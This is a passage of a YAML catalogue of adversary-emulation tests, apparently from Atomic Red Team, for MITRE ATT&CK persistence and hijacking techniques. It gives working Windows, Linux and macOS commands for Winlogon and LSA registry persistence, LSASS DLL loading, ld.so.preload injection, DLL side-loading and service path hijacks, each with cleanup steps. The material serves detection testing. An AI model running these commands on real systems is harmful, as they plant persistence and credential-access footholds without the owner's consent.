        net start w32time
      cleanup: |-
        net stop w32time
        reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /f
        rm -force C:\Users\Public\AtomicTest.dll
        net start w32time
      timeout: 120
      elevation_required: true
    - name: Edit an existing time provider
      type: powershell
      platform: windows
      command: |-
        net stop w32time
        Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "1" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "1" /f
        net start w32time
      cleanup: |-
        net stop w32time
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Windows\SYSTEM32\w32time.DLL" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "0" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "0" /f
        rm -force C:\Users\Public\AtomicTest.dll
        net start w32time
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/003
  is_safe: false
- id: T1547.004
  name: Winlogon Helper DLL
  description: Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionali...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Winlogon Shell Key Persistence - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
      timeout: 120
    - name: Winlogon Userinit Key Persistence - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
      timeout: 120
    - name: Winlogon Notify Key Logon Persistence - PowerShell
      type: powershell
      platform: windows
      command: |-
        New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "C:\Windows\Temp\atomicNotificationPackage.dll" -Type ExpandString -Force
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "AtomicTestFunction" -Force
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force
      cleanup: Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore
      timeout: 120
    - name: Winlogon HKLM Shell Key Persistence - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force
      cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
      timeout: 120
    - name: Winlogon HKLM Userinit Key Persistence - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
      cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1547/004
  is_safe: false
- id: T1547.005
  name: Security Support Provider
  description: |-
    Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

    The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <co...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry
      type: powershell
      platform: windows
      command: |-
        $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' -Value "$oldvalue";
        $newvalue = "AtomicTest.dll";
        Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
      cleanup: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
        Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value "$oldvalue";
        Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old';
      timeout: 120
      elevation_required: true
    - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry
      type: powershell
      platform: windows
      command: |-
        $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' -Value "$oldvalue";
        $newvalue = "AtomicTest.dll";
        Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue
      cleanup: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
        Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value "$oldvalue";
        Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old';
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/005
  is_safe: false
- id: T1547.006
  name: Kernel Modules and Extensions
  description: |-
    Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) 

    When used maliciously, LKMs can be a type of kernel-mode [Roo...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
    - linux
  executors:
    - name: Linux - Load Kernel Module via insmod
      type: bash
      platform: linux
      command: sudo insmod /tmp/T1547.006/T1547006.ko
      cleanup: |-
        sudo rmmod T1547006
        [ -f /tmp/T1547.006/safe_to_delete ] && rm -rf /tmp/T1547.006
      timeout: 60
      elevation_required: true
    - name: MacOS - Load Kernel Module via kextload and kmutil
      type: bash
      platform: macos
      command: |-
        set -x
        sudo kextload /Library/Extensions/SoftRAID.kext
        kextstat 2>/dev/null | grep SoftRAID
        sudo kextunload /Library/Extensions/SoftRAID.kext
        sudo kmutil load -p /Library/Extensions/SoftRAID.kext
        kextstat 2>/dev/null | grep SoftRAID
        sudo kmutil unload -p /Library/Extensions/SoftRAID.kext
      timeout: 60
      elevation_required: true
    - name: MacOS - Load Kernel Module via KextManagerLoadKextWithURL()
      type: bash
      platform: macos
      command: |-
        sudo /tmp/T1547006_iokit_loader
        kextstat 2>/dev/null | grep SoftRAID
        sudo kextunload /Library/Extensions/SoftRAID.kext
      cleanup: rm -f /tmp/T1547006_iokit_loader
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/006
  is_safe: false
- id: T1547.007
  name: Re-opened Applications
  description: 'Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to "Reopen windows when logging back in".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citat...'
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Copy in loginwindow.plist for Re-Opened Applications
      type: sh
      platform: macos
      command: cp PathToAtomicsFolder/T1547.007/src/reopen_loginwindow_calc.plist ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
      cleanup: rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
      timeout: 60
    - name: Re-Opened Applications using LoginHook
      type: sh
      platform: macos
      command: sudo defaults write com.apple.loginwindow LoginHook /path/to/script
      cleanup: sudo defaults delete com.apple.loginwindow LoginHook
      timeout: 60
      elevation_required: true
    - name: Append to existing loginwindow for Re-Opened Applications
      type: sh
      platform: macos
      command: |-
        FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
        if [ -z "${FILE}" ] ; then echo "No loginwindow plist file found" && exit 1 ; fi
        echo save backup copy to /tmp/
        cp ${FILE} /tmp/t1547007_loginwindow-backup.plist
        echo before
        plutil -p ${FILE}
        echo overwriting...
        /tmp/t1547007_append_exe ${FILE} && echo after && plutil -p ${FILE}
      cleanup: |-
        rm -f /tmp/t1547007_append_exe
        # revert to backup copy
        FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
        if [ -z "${FILE}" ] ; then
           exit 0
        fi
        mv /tmp/t1547007_loginwindow-backup.plist ${FILE}
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1547/007
  is_safe: false
- id: T1547.008
  name: LSASS Driver
  description: Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt
      type: powershell
      platform: windows
      command: New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "PathToAtomicsFolder\..\ExternalPayloads\lsass_lib.dll"
      cleanup: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS" -Name "LsaDbExtPt" -ErrorAction Ignore | Out-Null
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/008
  is_safe: false
- id: T1547.009
  name: Shortcut Modification
  description: |-
    Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

    Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attac...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Shortcut Modification
      type: cmd
      platform: windows
      command: |-
        echo [InternetShortcut] > %temp%\T1547.009_modified_shortcut.url
        echo URL=C:\windows\system32\calc.exe >> %temp%\T1547.009_modified_shortcut.url
        %temp%\T1547.009_modified_shortcut.url
      cleanup: del -f %temp%\T1547.009_modified_shortcut.url >nul 2>&1
      timeout: 120
    - name: Create shortcut to cmd in startup folders
      type: powershell
      platform: windows
      command: |-
        $Shell = New-Object -ComObject ("WScript.Shell")
        $ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")
        $ShortCut.TargetPath="cmd.exe"
        $ShortCut.WorkingDirectory = "C:\Windows\System32";
        $ShortCut.WindowStyle = 1;
        $ShortCut.Description = "T1547.009.";
        $ShortCut.Save()

        $Shell = New-Object -ComObject ("WScript.Shell")
        $ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")
        $ShortCut.TargetPath="cmd.exe"
        $ShortCut.WorkingDirectory = "C:\Windows\System32";
        $ShortCut.WindowStyle = 1;
        $ShortCut.Description = "T1547.009.";
        $ShortCut.Save()
      cleanup: |-
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore
        Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/009
  is_safe: false
- id: T1547.010
  name: Port Monitors
  description: "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) \n\nAlternatively, an arbitrary DLL can be loaded if ..."
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Add Port Monitor persistence in Registry
      type: cmd
      platform: windows
      command: reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /v "Driver" /d "$PathToAtomicsFolder\T1547.010\bin\PortMonitor.dll" /t REG_SZ /f
      cleanup: reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /f >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/010
  is_safe: false
- id: T1547.012
  name: Print Processors
  description: |-
    Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)

    Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Print Processors
      type: powershell
      platform: windows
      command: |-
        if( $(get-service -Name spooler).StartType -eq "Disabled") {Set-Service -Name "spooler" -StartupType Automatic}
        net stop spooler
        Copy-Item "$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /v "Driver" /d "AtomicTest.dll" /t REG_SZ /f
        net start spooler
        if(0){
          Restart-Computer
        }
      cleanup: |-
        net stop spooler
        rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue
        rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue
        remove-item "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" -Force -ErrorAction SilentlyContinue
        net start spooler
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/012
  is_safe: false
- id: T1547.014
  name: Active Setup
  description: |-
    Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.

    Adversaries may abuse Active Setup by creating a key under <...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: HKLM - Add atomic_test key to launch executable as part of user setup
      type: powershell
      platform: windows
      command: "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"C:\\Windows\\System32\\calc.exe\" -Force \n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
      cleanup: |-
        Remove-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" -Force -ErrorAction Ignore
        Remove-Item "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: HKLM - Add malicious StubPath value to existing Active Setup Entry
      type: powershell
      platform: windows
      command: |-
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" "StubPath" "C:\Windows\System32\calc.exe" -Force
        & $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
      cleanup: |-
        Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "StubPath" -Force
        Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Force
      timeout: 120
      elevation_required: true
    - name: HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number
      type: powershell
      platform: windows
      command: |-
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Value "0,0,0,0"
        & $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/014
  is_safe: false
- id: T1547.015
  name: Login Items
  description: 'Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T10...'
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Add macOS LoginItem using Applescript
      type: bash
      platform: macos
      command: osascript PathToAtomicsFolder/T1547.015/src/add_login_item.osa
      cleanup: osascript PathToAtomicsFolder/T1547.015/src/remove_login_item.osa
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1547/015
  is_safe: false
- id: T1574.001
  name: DLL
  description: |-
    Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

    Specific ways DLLs are abused by adversaries include:

    ### DLL Sideloading
    Adversaries may exec...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: DLL Search Order Hijacking - amsi.dll
      type: cmd
      platform: windows
      command: |-
        copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
        %APPDATA%\updater.exe -Command exit
      cleanup: |-
        del %APPDATA%\updater.exe >nul 2>&1
        del %APPDATA%\amsi.dll >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Phantom Dll Hijacking - WinAppXRT.dll
      type: cmd
      platform: windows
      command: |-
        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
        ren %APPDATA%\amsi.dll WinAppXRT.dll
        copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll
        reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /f
        del %windir%\System32\WinAppXRT.dll
        del %APPDATA%\WinAppXRT.dll
      timeout: 120
      elevation_required: true
    - name: Phantom Dll Hijacking - ualapi.dll
      type: cmd
      platform: windows
      command: |-
        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
        ren %APPDATA%\amsi.dll ualapi.dll
        copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll
        sc config Spooler start=auto
      cleanup: |-
        del %windir%\System32\ualapi.dll
        del %APPDATA%\ualapi.dll
      timeout: 120
      elevation_required: true
    - name: DLL Side-Loading using the Notepad++ GUP.exe binary
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1574.002\bin\GUP.exe"'
      cleanup: taskkill /F /IM calculator.exe >nul 2>&1
      timeout: 120
    - name: DLL Side-Loading using the dotnet startup hook environment variable
      type: cmd
      platform: windows
      command: |-
        set DOTNET_STARTUP_HOOKS="PathToAtomicsFolder\T1574.002\bin\preloader.dll"
        dotnet -h > nul
        echo.
      cleanup: taskkill /F /IM calculator.exe >nul 2>&1
      timeout: 120
    - name: DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE
      type: powershell
      platform: windows
      command: |-
        Write-Host 1.Downloading KeyScrambler from official website to temp directory
        Invoke-WebRequest -Uri "https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe" -OutFile $env:Temp\KeyScrambler_Setup.exe
        Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory
        Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait
        Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp
        Copy-Item "C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe" -Destination $env:TEMP\KeyScrambler.exe
        Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup
        Start-Process -FilePath $env:Temp\KeyScrambler.exe
        Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker
      cleanup: |-
        Write-Host 1.Kindly close the popup window asking for KeyScramblerIE.dll ,so that it gets deleted.

        Remove-Item -Path $env:Temp\KeyScrambler_Setup.exe
        Start-Process -FilePath "C:\Program Files (x86)\KeyScrambler\Uninstall.exe" -ArgumentList /S -Wait
        Remove-Item -Path $env:Temp\KeyScrambler.exe
        Write-Host 2.KeyScrambler cleanup completed successfully.
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1574/001
  is_safe: false
- id: T1574.006
  name: Dynamic Linker Hijacking
  description: 'Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo D...'
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - linux
    - macos
  executors:
    - name: Shared Library Injection via /etc/ld.so.preload
      type: bash
      platform: linux
      command: sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'
      cleanup: sudo sed -i 's#/tmp/T1574006.so##' /etc/ld.so.preload
      timeout: 60
      elevation_required: true
    - name: Shared Library Injection via LD_PRELOAD
      type: bash
      platform: linux
      command: LD_PRELOAD=/tmp/T1574006.so ls
      timeout: 60
    - name: Dylib Injection via DYLD_INSERT_LIBRARIES
      type: bash
      platform: macos
      command: DYLD_INSERT_LIBRARIES=/tmp/T1574006MOS.dylib /Applications/Firefox.app/Contents/MacOS/firefox
      cleanup: |-
        kill `pgrep Calculator`
        kill `pgrep firefox`
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1574/006
  is_safe: false
- id: T1574.008
  name: Path Interception by Search Order Hijacking
  description: |-
    Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

    Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: powerShell Persistence via hijacking default modules - Get-Variable.exe
      type: powershell
      platform: windows
      command: |-
        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:"$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" "PathToAtomicsFolder\T1574.008\bin\calc.cs"
        Powershell -noprofile
      cleanup: |-
        Remove-Item "$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" -ErrorAction Ignore
        Stop-Process -Name "calculator"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1574/008
  is_safe: false
- id: T1574.009
  name: Path Interception by Unquoted Path
  description: |-
    Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

    Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quota...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: Execution of program.exe as service with unquoted service path
      type: cmd
      platform: windows
      command: |-
        copy "PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe" "C:\Program Files\windows_service.exe"
        copy "PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe" "C:\program.exe"
        sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
        sc start "Example Service"
      cleanup: |-
        sc stop "Example Service" >nul 2>&1
        sc delete "Example Service" >nul 2>&1
        del "C:\Program Files\windows_service.exe" >nul 2>&1
        del "C:\program.exe" >nul 2>&1
        del "C:\Time.log" >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1574/009
  is_safe: false
- id: T1574.011
  name: Services Registry Permissions Weakness
  description: Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Flaws in the permissions for Registry keys related to services can allow adversaries to redirect the originally specified executable to one they control, launching their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be m...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: Service Registry Permissions Weakness
      type: powershell
      platform: windows
      command: |-
        get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
        get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL
      timeout: 120
    - name: Service ImagePath Change with reg.exe
      type: cmd
      platform: windows
      command: reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\calcservice" /f /v ImagePath /d "%windir%\system32\cmd.exe"
      cleanup: sc.exe delete calcservice
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1574/011
  is_safe: false
- id: T1574.012
  name: COR_PROFILER
  description: 'Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microso...'
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: User scope COR_PROFILER
      type: powershell
      platform: windows
      command: |-
        Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan
